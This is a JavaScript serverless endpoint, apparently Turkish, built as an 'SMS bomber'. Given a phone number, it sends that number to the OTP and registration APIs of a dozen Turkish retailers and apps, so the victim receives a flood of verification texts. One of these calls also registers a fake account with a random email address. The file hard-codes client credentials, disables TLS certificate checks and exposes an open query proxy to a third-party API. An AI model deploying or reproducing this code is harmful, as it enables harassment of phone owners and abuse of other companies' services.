// api/proxy.js
const https = require('https');

const agent = new https.Agent({ rejectUnauthorized: false });

const rnd = (n = 8) => Array.from({ length: n }, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]).join('');
const rnum = (n = 4) => Math.floor(Math.random() * Math.pow(10, n));
const phone0 = (p) => `0${p}`;
const phone90 = (p) => `90${p}`;

// fetch yardımcısı - timeout'lu
async function post(url, body, headers = {}) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 10000);
    try {
        const r = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', ...headers },
            body: JSON.stringify(body),
            signal: controller.signal,
            // Vercel Node 18+ fetch, https agent kabul etmez; normal fetch yeterli
        });
        let data = null;
        try { data = await r.json(); } catch (e) { data = await r.text().catch(() => null); }
        return { ok: r.ok, status: r.status, data };
    } finally {
        clearTimeout(timer);
    }
}

async function get(url, headers = {}) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 10000);
    try {
        const r = await fetch(url, { headers, signal: controller.signal });
        let data = null;
        try { data = await r.json(); } catch (e) { data = await r.text().catch(() => null); }
        return { ok: r.ok, status: r.status, data };
    } finally {
        clearTimeout(timer);
    }
}

const services = {
    bim: async (p) => { await post('https://bim.veesk.net/service/v1.0/account/login', { phone: phone90(p) }); return true; },
    file: async (p) => { const r = await post('https://api.filemarket.com.tr/v1/otp/send', { mobilePhoneNumber: phone90(p) }); return r.data?.data === '200 OK'; },
    aygaz: async (p) => { await post('https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode', { Gsm: p }); return true; },
    qumpara: async (p) => { await post('https://tr-api.fisicek.com/v1.4/auth/getOTP', { msisdn: p }); return true; },
    mopas: async (p) => {
        const tr = await post('https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials', null);
        if (!tr.data?.access_token) return false;
        await get(`https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber=${p}`, { authorization: `${tr.data.token_type} ${tr.data.access_token}` });
        return true;
    },
    saka: async (p) => { const r = await post('https://mobilcrm2.saka.com.tr/api/customer/login', { gsm: phone0(p) }); return r.data?.status === 1; },
    gofody: async (p) => { const r = await post('https://backend.gofody.com/api/v1/enduser/register/', { country_code: '90', phone: p }); return r.data?.success === true; },
    scooby: async (p) => { await get(`https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90${p}`); return true; },
    pinar: async (p) => { const r = await post('https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp', { MobilePhone: p }, { devicetype: 'android' }); return String(r.data).toLowerCase() === 'true'; },
    marti: async (p) => { const r = await post('https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin', { mobilePhone: p, mobilePhoneCountryCode: '90' }); return r.data?.isSuccess === true; },
    karma: async (p) => { await post('https://api.gokarma.app/v1/auth/send-sms', { phoneNumber: phone90(p), type: 'REGISTER', deviceId: rnd(16), language: 'tr-TR' }); return true; },
    englishhome: async (p) => { await post('https://www.englishhome.com:443/enh_app/users/registration/', { first_name: 'Test', last_name: 'Test', email: `t${rnum()}@gmail.com`, phone: phone0(p), password: 'Password123!', email_allowed: false, sms_allowed: false, confirm: true, tom_pay_allowed: true }); return true; }
};

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();

    try {
        const query = req.query || {};
        const { action, phone, endpoint, ...params } = query;

        // ─── SMS BOMBER ───
        if (action === 'smsbomber') {
            if (!phone) return res.status(400).json({ error: 'Telefon numarası gerekli.' });
            if (!/^\d{10}$/.test(phone)) return res.status(400).json({ error: 'Telefon numarası 10 haneli olmalı (örn: 5551234567).' });

            const results = [];
            for (const [name, fn] of Object.entries(services)) {
                try {
                    const success = await fn(phone);
                    results.push({ service: name, success, message: success ? 'Gönderildi' : 'Yanıt başarısız' });
                } catch (e) {
                    results.push({ service: name, success: false, message: e.message });
                }
            }

            const basarili = results.filter(r => r.success).length;
            return res.status(200).json({ total: results.length, basarili, basarisiz: results.length - basarili, results });
        }

        // ─── STANDART SORGU ───
        if (!endpoint) return res.status(400).json({ error: 'Endpoint belirtilmedi.' });

        try {
            const url = new URL(`https://api.ajaxsystems.fun/${endpoint}`);
            Object.entries(params).forEach(([k, v]) => url.searchParams.set(k, v));
            const r = await fetch(url.toString(), { signal: AbortSignal.timeout(9000) });
            let data = null;
            try { data = await r.json(); } catch (e) { data = await r.text().catch(() => null); }
            return res.status(200).json(data);
        } catch (error) {
            return res.status(200).json({ error: error.message || 'API isteği başarısız oldu.' });
        }

    } catch (globalError) {
        console.error('[PROXY GLOBAL HATA]', globalError);
        return res.status(500).json({ error: 'Sunucu hatası: ' + (globalError.message || 'Bilinmeyen hata') });
    }
};
